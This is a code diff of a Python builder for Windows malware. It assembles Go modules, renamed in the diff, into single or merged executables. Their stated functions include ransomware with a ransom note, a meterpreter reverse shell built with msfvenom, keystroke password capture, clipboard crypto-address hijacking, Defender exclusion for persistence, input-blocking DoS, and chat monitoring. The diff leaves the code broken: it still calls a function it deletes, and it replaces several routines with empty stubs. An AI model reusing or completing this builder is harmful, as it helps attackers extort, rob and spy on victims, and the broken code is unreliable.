@@ -8,16 +8,14 @@ import fileinput
 import base64
 
 MODULES = {
-    'daemon/filedaemon': {'desc': 'Normal C2 server to receive data'},
-    'daemon/spider': {'desc': 'Metasploit C2 server (reverse shell/payload delivery)'},
-    'daemon/bartmoss': {'desc': 'Ransomware builder'},
-    'daemon/chatwipe': {'desc': 'WhatsApp chat extractor'},
-    'daemon/alt': {'desc': 'Extract users passwords as they are typed'},
-    'interfaceplug/blackout': {'desc': 'Screen blackout utility'},
-    'interfaceplug/suicide': {'desc': 'Block input (DoS)'},
-    'quickhack/ping': {'desc': 'Sends back user info to the C2 server'},
-    'quickhack/icepick': {'desc': 'Adds EXE to persistence and adds exclusion to Windows Defender'},
-    'interfaceplug/ripper': {'desc': 'Clipboard wallet address ripper'},
+    'daemon/roadrunner': {'desc': 'Scans and exfiltrates system and network info'},
+    'daemon/hellhound': {'desc': 'Gains persistence and disables Defender protections'},
+    'daemon/gremlin': {'desc': 'Hijacks clipboard crypto addresses'},
+    'daemon/blackice': {'desc': 'Blacks out the screen to disrupt user activity'},
+    'daemon/logicbomb': {'desc': 'Blocks input and triggers DoS on the target'},
+    'daemon/flatline': {'desc': 'Provides a reverse shell for remote access'},
+    'daemon/krash': {'desc': 'Wipes data and crashes the system using ransomware'},
+    'daemon/overwatch': {'desc': 'Monitors all victims chats'},
 }
 
 MODULE_CHAIN = []
@@ -28,25 +26,36 @@ BUILD_OPTIONS = {
 }
 
 MODULE_OPTIONS = {
-    'daemon/spider': {
-        'LHOST': '0.0.0.0',
-        'LPORT': '4444',
-        'KEY': 'changeme',
-    },
-    'daemon/filedaemon': {
-        'PORT': '8080',
+    'daemon/roadrunner': {
         'TARGET_IP': '127.0.0.1',
         'TARGET_PORT': '9000',
     },
-    'daemon/bartmoss': {
-        'NOTE': 'Your ransom note here',
+    'daemon/hellhound': {
+        'PERSISTENCE': 'true',
+        'DEFENDER_EXCLUDE': 'true',
     },
-    'interfaceplug/ripper': {
+    'daemon/gremlin': {
         'BTC_ADDRESS': '1BitcoinPredefinedAddressExample1234',
         'ETH_ADDRESS': '0xEthereumPredefinedAddress1234567890abcdef',
         'BEP20_ADDRESS': '0xBEP20PredefinedAddress1234567890abcdef',
         'SOL_ADDRESS': 'So1anaPredefinedAddressExample1234567890',
     },
+    'daemon/blackice': {
+        'DURATION': '60',
+    },
+    'daemon/logicbomb': {
+        'BLOCK_INPUT': 'true',
+        'TRIGGER_DELAY': '10',
+    },
+    'daemon/flatline': {
+        'LHOST': '0.0.0.0',
+        'LPORT': '4444',
+        'KEY': 'changeme',
+    },
+    'daemon/krash': {
+        'NOTE': 'Your ransom note here',
+    },
+    'daemon/overwatch': {},
 }
 
 COMMANDS = ['use', 'build', 'clear', 'delete', 'show modules', 'show options', 'exit', 'set']
@@ -65,7 +74,7 @@ ASCII_ART = f'''
       {RED}/||              ||{RESET}                      )_ /*
      {RED}/ ||    {PINK}System{RESET}    {RED}||{RESET}                           *
     {RED}|  ||     {PINK}Down{RESET}     {RED}||{RESET}                    (=====~*~======)
-     {RED}\\ || {PINK}Please wait{RESET}  {RED}||{RESET}                   0      \\ /       0
+     {RED}\\ || {PINK} Please wait{RESET} {RED}||{RESET}                   0      \\ /       0
        {RED}=================={RESET}                //   (====*====)   ||
 {RED}........... /      \\.............{RESET}      //         *         ||
 {RED}:\\        ############            \\{RESET}    ||    (=====*======)  ||
@@ -157,8 +166,8 @@ def colorize_message(msg):
     else:
         return f"{YELLOW}{msg}{RESET}"
 
-def patch_bartmoss_note(note):
-    go_path = os.path.join('DAEMONS', 'bartmoss.go')
+def patch_krash_note(note):
+    go_path = os.path.join('DAEMONS', 'krash.go')
     with open(go_path, 'r') as f:
         lines = f.readlines()
     with open(go_path, 'w') as f:
@@ -169,27 +178,13 @@ def patch_bartmoss_note(note):
                 f.write(line)
     return lines
 
-def restore_bartmoss_go(original_lines):
-    go_path = os.path.join('DAEMONS', 'bartmoss.go')
+def restore_krash_go(original_lines):
+    go_path = os.path.join('DAEMONS', 'krash.go')
     with open(go_path, 'w') as f:
         f.writelines(original_lines)
 
-def generate_msfvenom_exe(lhost, lport, output_path):
-    import subprocess
-    cmd = [
-        'msfvenom',
-        '-p', 'windows/x64/meterpreter/reverse_tcp',
-        f'LHOST={lhost}',
-        f'LPORT={lport}',
-        '-f', 'exe',
-        '-o', output_path
-    ]
-    result = subprocess.run(cmd, capture_output=True)
-    if result.returncode != 0:
-        raise RuntimeError(f"msfvenom failed: {result.stderr.decode()}")
-
-def patch_spider_base64(exe_path):
-    go_path = os.path.join('DAEMONS', 'spider.go')
+def patch_flatline_base64(exe_path):
+    go_path = os.path.join('DAEMONS', 'flatline.go')
     with open(exe_path, 'rb') as f:
         b64 = base64.b64encode(f.read()).decode()
     with open(go_path, 'r') as f:
@@ -202,39 +197,52 @@ def patch_spider_base64(exe_path):
                 f.write(line)
     return lines 
 
-def restore_spider_go(original_lines):
-    go_path = os.path.join('DAEMONS', 'spider.go')
+def restore_flatline_go(original_lines):
+    go_path = os.path.join('DAEMONS', 'flatline.go')
     with open(go_path, 'w') as f:
         f.writelines(original_lines)
 
-def patch_filedaemon_env(target_ip, target_port):
+def patch_roadrunner_env(target_ip, target_port):
     return None
 
-def restore_filedaemon_go(original_lines):
+def restore_roadrunner_go(original_lines):
     pass
 
-def patch_ripper_addresses(btc, eth, bep20, sol):
-    go_path = os.path.join('INTERFACEPLUGS', 'ripper.go')
-    with open(go_path, 'r') as f:
-        lines = f.readlines()
-    with open(go_path, 'w') as f:
-        for line in lines:
-            if line.strip().startswith('predefinedBitcoinAddress'):
-                f.write(f'\tpredefinedBitcoinAddress  = "{btc}"\n')
-            elif line.strip().startswith('predefinedEthereumAddress'):
-                f.write(f'\tpredefinedEthereumAddress = "{eth}"\n')
-            elif line.strip().startswith('predefinedBEP20Address'):
-                f.write(f'\tpredefinedBEP20Address    = "{bep20}"\n')
-            elif line.strip().startswith('predefinedSolanaAddress'):
-                f.write(f'\tpredefinedSolanaAddress   = "{sol}"\n')
-            else:
-                f.write(line)
-    return lines
+def patch_hellhound_options(persistence, defender_exclude):
+    return None
 
-def restore_ripper_go(original_lines):
-    go_path = os.path.join('INTERFACEPLUGS', 'ripper.go')
-    with open(go_path, 'w') as f:
-        f.writelines(original_lines)
+def restore_hellhound_go(original_lines):
+    pass
+
+def patch_gremlin_addresses(btc_address, eth_address, bep20_address, sol_address):
+    return None
+
+def restore_gremlin_go(original_lines):
+    pass
+
+def patch_blackice_options(duration):
+    return None
+
+def restore_blackice_go(original_lines):
+    pass
+
+def patch_logicbomb_options(block_input, trigger_delay):
+    return None
+
+def restore_logicbomb_go(original_lines):
+    pass
+
+def patch_flatline_options(lhost, lport, key):
+    return None
+
+def restore_flatline_go(original_lines):
+    pass
+
+def patch_overwatch_options():
+    return None
+
+def restore_overwatch_go(original_lines):
+    pass
 
 def shell():
     current_module = None
@@ -280,38 +288,58 @@ def shell():
                         modname = MODULE_CHAIN[0]
                         output_lines.append(f"Building single module: {modname}")
                         
-                        go_path = modname.replace('daemon/', 'DAEMONS/').replace('quickhack/', 'QUICKHACKS/').replace('interfaceplug/', 'INTERFACEPLUGS/') + '.go'
-                        bartmoss_original = None
-                        spider_original = None
-                        filedaemon_original = None
-                        ripper_original = None
+                        go_path = modname.replace('daemon/', 'DAEMONS/') + '.go'
+                        krash_original = None
+                        flatline_original = None
+                        roadrunner_original = None
+                        hellhound_original = None
+                        gremlin_original = None
+                        blackice_original = None
+                        logicbomb_original = None
+                        overwatch_original = None
                         
-                        if modname == 'daemon/bartmoss':
-                            note = MODULE_OPTIONS.get('daemon/bartmoss', {}).get('NOTE', 'YOUR NOTE HERE')
-                            bartmoss_original = patch_bartmoss_note(note)
-                        elif modname == 'daemon/spider':
-                            opts = MODULE_OPTIONS.get('daemon/spider', {})
+                        if modname == 'daemon/krash':
+                            note = MODULE_OPTIONS.get('daemon/krash', {}).get('NOTE', 'YOUR NOTE HERE')
+                            krash_original = patch_krash_note(note)
+                        elif modname == 'daemon/flatline':
+                            opts = MODULE_OPTIONS.get('daemon/flatline', {})
                             lhost = opts.get('LHOST', '0.0.0.0')
                             lport = opts.get('LPORT', '4444')
-                            payload_path = os.path.join('.LOOT', 'spider_payload.exe')
+                            payload_path = os.path.join('.LOOT', 'flatline_payload.exe')
                             try:
                                 generate_msfvenom_exe(lhost, lport, payload_path)
                             except Exception as e:
                                 output_lines.append(f"Failed to generate msfvenom payload: {e}")
                                 continue
-                            spider_original = patch_spider_base64(payload_path)
-                        elif modname == 'daemon/filedaemon':
-                            opts = MODULE_OPTIONS.get('daemon/filedaemon', {})
+                            flatline_original = patch_flatline_base64(payload_path)
+                        elif modname == 'daemon/roadrunner':
+                            opts = MODULE_OPTIONS.get('daemon/roadrunner', {})
                             target_ip = opts.get('TARGET_IP', '127.0.0.1')
                             target_port = opts.get('TARGET_PORT', '9000')
-                            filedaemon_original = patch_filedaemon_env(target_ip, target_port)
-                        elif modname == 'interfaceplug/ripper':
-                            opts = MODULE_OPTIONS.get('interfaceplug/ripper', {})
-                            btc = opts.get('BTC_ADDRESS', '1BitcoinPredefinedAddressExample1234')
-                            eth = opts.get('ETH_ADDRESS', '0xEthereumPredefinedAddress1234567890abcdef')
-                            bep20 = opts.get('BEP20_ADDRESS', '0xBEP20PredefinedAddress1234567890abcdef')
-                            sol = opts.get('SOL_ADDRESS', 'So1anaPredefinedAddressExample1234567890')
-                            ripper_original = patch_ripper_addresses(btc, eth, bep20, sol)
+                            roadrunner_original = patch_roadrunner_env(target_ip, target_port)
+                        elif modname == 'daemon/hellhound':
+                            opts = MODULE_OPTIONS.get('daemon/hellhound', {})
+                            persistence = opts.get('PERSISTENCE', 'true')
+                            defender_exclude = opts.get('DEFENDER_EXCLUDE', 'true')
+                            hellhound_original = patch_hellhound_options(persistence, defender_exclude)
+                        elif modname == 'daemon/gremlin':
+                            opts = MODULE_OPTIONS.get('daemon/gremlin', {})
+                            btc_address = opts.get('BTC_ADDRESS', '1BitcoinPredefinedAddressExample1234')
+                            eth_address = opts.get('ETH_ADDRESS', '0xEthereumPredefinedAddress1234567890abcdef')
+                            bep20_address = opts.get('BEP20_ADDRESS', '0xBEP20PredefinedAddress1234567890abcdef')
+                            sol_address = opts.get('SOL_ADDRESS', 'So1anaPredefinedAddressExample1234567890')
+                            gremlin_original = patch_gremlin_addresses(btc_address, eth_address, bep20_address, sol_address)
+                        elif modname == 'daemon/blackice':
+                            opts = MODULE_OPTIONS.get('daemon/blackice', {})
+                            duration = opts.get('DURATION', '60')
+                            blackice_original = patch_blackice_options(duration)
+                        elif modname == 'daemon/logicbomb':
+                            opts = MODULE_OPTIONS.get('daemon/logicbomb', {})
+                            block_input = opts.get('BLOCK_INPUT', 'true')
+                            trigger_delay = opts.get('TRIGGER_DELAY', '10')
+                            logicbomb_original = patch_logicbomb_options(block_input, trigger_delay)
+                        elif modname == 'daemon/overwatch':
+                            overwatch_original = patch_overwatch_options()
                         
                         module_name = modname.split('/')[-1]
                         final_name = f"{module_name}.exe"
@@ -331,51 +359,79 @@ def shell():
                         else:
                             output_lines.append("Failed to create single module EXE.")
                         
-                        if bartmoss_original:
-                            restore_bartmoss_go(bartmoss_original)
-                        if spider_original:
-                            restore_spider_go(spider_original)
-                        if filedaemon_original:
-                            restore_filedaemon_go(filedaemon_original)
-                        if ripper_original:
-                            restore_ripper_go(ripper_original)
+                        if krash_original:
+                            restore_krash_go(krash_original)
+                        if flatline_original:
+                            restore_flatline_go(flatline_original)
+                        if roadrunner_original:
+                            restore_roadrunner_go(roadrunner_original)
+                        if hellhound_original:
+                            restore_hellhound_go(hellhound_original)
+                        if gremlin_original:
+                            restore_gremlin_go(gremlin_original)
+                        if blackice_original:
+                            restore_blackice_go(blackice_original)
+                        if logicbomb_original:
+                            restore_logicbomb_go(logicbomb_original)
+                        if overwatch_original:
+                            restore_overwatch_go(overwatch_original)
                         
                         MODULE_CHAIN.clear()
                     else:
                         output_lines.append(f"Building merged malware with {len(MODULE_CHAIN)} modules...")
                         go_paths = []
-                        bartmoss_original = None
-                        spider_original = None
-                        filedaemon_original = None
-                        ripper_original = None
+                        krash_original = None
+                        flatline_original = None
+                        roadrunner_original = None
+                        hellhound_original = None
+                        gremlin_original = None
+                        blackice_original = None
+                        logicbomb_original = None
+                        overwatch_original = None
                         for modname in MODULE_CHAIN:
-                            go_path = modname.replace('daemon/', 'DAEMONS/').replace('quickhack/', 'QUICKHACKS/').replace('interfaceplug/', 'INTERFACEPLUGS/') + '.go'
-                            if modname == 'daemon/bartmoss':
-                                note = MODULE_OPTIONS.get('daemon/bartmoss', {}).get('NOTE', 'YOUR NOTE HERE')
-                                bartmoss_original = patch_bartmoss_note(note)
-                            if modname == 'daemon/spider':
-                                opts = MODULE_OPTIONS.get('daemon/spider', {})
+                            go_path = modname.replace('daemon/', 'DAEMONS/') + '.go'
+                            if modname == 'daemon/krash':
+                                note = MODULE_OPTIONS.get('daemon/krash', {}).get('NOTE', 'YOUR NOTE HERE')
+                                krash_original = patch_krash_note(note)
+                            if modname == 'daemon/flatline':
+                                opts = MODULE_OPTIONS.get('daemon/flatline', {})
                                 lhost = opts.get('LHOST', '0.0.0.0')
                                 lport = opts.get('LPORT', '4444')
-                                payload_path = os.path.join('.LOOT', 'spider_payload.exe')
+                                payload_path = os.path.join('.LOOT', 'flatline_payload.exe')
                                 try:
                                     generate_msfvenom_exe(lhost, lport, payload_path)
                                 except Exception as e:
                                     output_lines.append(f"Failed to generate msfvenom payload: {e}")
                                     continue
-                                spider_original = patch_spider_base64(payload_path)
-                            if modname == 'daemon/filedaemon':
-                                opts = MODULE_OPTIONS.get('daemon/filedaemon', {})
+                                flatline_original = patch_flatline_base64(payload_path)
+                            if modname == 'daemon/roadrunner':
+                                opts = MODULE_OPTIONS.get('daemon/roadrunner', {})
                                 target_ip = opts.get('TARGET_IP', '127.0.0.1')
                                 target_port = opts.get('TARGET_PORT', '9000')
-                                filedaemon_original = patch_filedaemon_env(target_ip, target_port)
-                            if modname == 'interfaceplug/ripper':
-                                opts = MODULE_OPTIONS.get('interfaceplug/ripper', {})
-                                btc = opts.get('BTC_ADDRESS', '1BitcoinPredefinedAddressExample1234')
-                                eth = opts.get('ETH_ADDRESS', '0xEthereumPredefinedAddress1234567890abcdef')
-                                bep20 = opts.get('BEP20_ADDRESS', '0xBEP20PredefinedAddress1234567890abcdef')
-                                sol = opts.get('SOL_ADDRESS', 'So1anaPredefinedAddressExample1234567890')
-                                ripper_original = patch_ripper_addresses(btc, eth, bep20, sol)
+                                roadrunner_original = patch_roadrunner_env(target_ip, target_port)
+                            if modname == 'daemon/hellhound':
+                                opts = MODULE_OPTIONS.get('daemon/hellhound', {})
+                                persistence = opts.get('PERSISTENCE', 'true')
+                                defender_exclude = opts.get('DEFENDER_EXCLUDE', 'true')
+                                hellhound_original = patch_hellhound_options(persistence, defender_exclude)
+                            if modname == 'daemon/gremlin':
+                                opts = MODULE_OPTIONS.get('daemon/gremlin', {})
+                                btc_address = opts.get('BTC_ADDRESS', '1BitcoinPredefinedAddressExample1234')
+                                eth_address = opts.get('ETH_ADDRESS', '0xEthereumPredefinedAddress1234567890abcdef')
+                                bep20_address = opts.get('BEP20_ADDRESS', '0xBEP20PredefinedAddress1234567890abcdef')
+                                sol_address = opts.get('SOL_ADDRESS', 'So1anaPredefinedAddressExample1234567890')
+                                gremlin_original = patch_gremlin_addresses(btc_address, eth_address, bep20_address, sol_address)
+                            if modname == 'daemon/blackice':
+                                opts = MODULE_OPTIONS.get('daemon/blackice', {})
+                                duration = opts.get('DURATION', '60')
+                                blackice_original = patch_blackice_options(duration)
+                            if modname == 'daemon/logicbomb':
+                                opts = MODULE_OPTIONS.get('daemon/logicbomb', {})
+                                block_input = opts.get('BLOCK_INPUT', 'true')
+                                trigger_delay = opts.get('TRIGGER_DELAY', '10')
+                                logicbomb_original = patch_logicbomb_options(block_input, trigger_delay)
+                            if modname == 'daemon/overwatch':
+                                overwatch_original = patch_overwatch_options()
                             go_paths.append(go_path)
                         final_name = BUILD_OPTIONS['exe_name']
                         final_path = os.path.abspath(os.path.join(loot_dir, final_name))
@@ -390,14 +446,22 @@ def shell():
                             output_lines.append(f"Final merged EXE: {final_path}")
                         else:
                             output_lines.append("Failed to create merged EXE.")
-                        if bartmoss_original:
-                            restore_bartmoss_go(bartmoss_original)
-                        if spider_original:
-                            restore_spider_go(spider_original)
-                        if filedaemon_original:
-                            restore_filedaemon_go(filedaemon_original)
-                        if ripper_original:
-                            restore_ripper_go(ripper_original)
+                        if krash_original:
+                            restore_krash_go(krash_original)
+                        if flatline_original:
+                            restore_flatline_go(flatline_original)
+                        if roadrunner_original:
+                            restore_roadrunner_go(roadrunner_original)
+                        if hellhound_original:
+                            restore_hellhound_go(hellhound_original)
+                        if gremlin_original:
+                            restore_gremlin_go(gremlin_original)
+                        if blackice_original:
+                            restore_blackice_go(blackice_original)
+                        if logicbomb_original:
+                            restore_logicbomb_go(logicbomb_original)
+                        if overwatch_original:
+                            restore_overwatch_go(overwatch_original)
                         MODULE_CHAIN.clear()
             elif cmd == 'clear':
                 MODULE_CHAIN.clear()
